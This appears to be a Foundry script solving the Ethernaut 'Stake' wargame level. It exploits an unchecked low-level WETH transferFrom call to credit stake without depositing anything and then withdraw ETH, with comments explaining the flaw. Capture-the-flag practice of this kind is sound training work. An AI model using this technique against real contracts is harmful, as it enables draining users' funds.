// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Stake} from "../../src/31/Stake.sol";
import {StakeFactory} from "src/31/StakeFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract StakeExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL31_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new StakeFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        Stake instanceContract = Stake(instance);
        // The player's stake needs to be 0, so we will use a contract to stake a little bit of eth. Then we will unstake a little bit less than the total eth balance of the contract.
        Exploit exploit = new Exploit(instanceContract);
        uint256 minAmountToStake = 0.001 ether + 1;
        exploit.stakeETH{value: minAmountToStake + 1}();

        // The call (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount)); is not checked if it was well executed. The execution of StakeWETH will work and increase our stake even if we didnt deposit anything. This will increase totalStaked without increasing the eth balance of the contract. We then unstake everything so that the player's stake == 0 while totalStaked > eth balance. We stake a little bit less than the total eth balance so that eth balance > 0 at the end.
        IERC20(instanceContract.WETH()).approve(address(instanceContract), type(uint256).max);
        instanceContract.StakeWETH(minAmountToStake);
        instanceContract.Unstake(minAmountToStake);

        // DONE !

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    address internal immutable owner;
    Stake internal immutable stake;

    constructor(Stake _stake) {
        owner = msg.sender;
        stake = _stake;
    }

    function stakeETH() external payable {
        require(msg.sender == owner);

        stake.StakeETH{value: msg.value}();
    }
}